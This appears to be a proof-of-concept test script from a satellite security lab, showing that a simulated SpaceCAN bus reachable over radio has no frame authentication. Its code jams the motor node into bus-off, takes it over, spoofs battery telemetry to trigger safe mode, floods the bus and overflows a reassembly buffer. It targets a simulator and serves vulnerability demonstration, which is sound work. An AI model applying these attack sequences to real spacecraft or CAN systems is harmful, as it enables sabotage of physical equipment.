#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-25  The radio bridges onto the (simulated) SpaceCAN physical bus with
# zero frame authentication: attacker can command the motor node, spoof
# the battery node, jam via arbitration flood, and overflow the reasm
# buffer -- all through raw TCs.
# SPARTA: LM-0002 / PR-0002.02 (physical bus exposure)
def main(dev, ev):
    def sc(d):
        return dev.find(dev.tc(0x1C, d, via="radio"), 0x1C)[0]
    def motor(pw):
        return sc(bytes([0]) + (0x284).to_bytes(4, "big") + bytes([2, 1, pw]))

    dev.tc(0x04, bytes([0, 0]), via="usb")           # t0 baseline 0
    check(dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0].u8(5) == 0,
          "t0 zero baseline")
    # 1) arbitration jam: 32 malformed motor frames -> node BUS-OFF
    for i in range(32):
        sc(bytes([0]) + (0x284).to_bytes(4, "big") + bytes([1, 0x99]))
    r = motor(123)
    ev.log(f"after junk storm: busoff mask=0x{r.u8(3):02X} err={r.u8(5)}")
    check(r.u8(3) & 1, "motor node BUS-OFF")
    check(dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0].u8(5) == 0,
          "BUS-OFF node ignores valid commands")
    # 2) node reset (also unauthenticated) and takeover of the motor
    sc(bytes([3]) + (0x284).to_bytes(4, "big") + bytes([0]))
    motor(123)
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    check(st.u8(5) == 123, "attacker commands the motor node directly")
    # 3) battery node spoof -> false SOC -> undervoltage safe mode
    sc(bytes([0]) + (0x287).to_bytes(4, "big") + bytes([2, 1, 5]))
    dev.advance(500)
    f = dev.find(dev.tc(0x1D, b"\x00", via="usb"), 0x1D)[0]
    ev.log(f"spoofed charge=5 -> bus={f.le16(10)/100:.2f} V safe={f.u8(2)}")
    check(f.u8(2) == 1, "forged battery telemetry drives BUS_UNDERV safe")
    # 4) arbitration flood congestion
    r = sc(bytes([1, 60]))                            # 60 frames now
    check(r.u8(4) == 1, "bus congestion (starvation) detected")
    # 5) fragment reassembly overflow
    r = sc(bytes([4]))
    check(r.u8(2) == 1, "reassembly overflow flagged")
    ev.log("=> every CAN-layer attack class (jam/spoof/replay/overflow) "
           "is reachable from the raw radio, unauthenticated")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-25 unauthenticated SpaceCAN via radio", main))
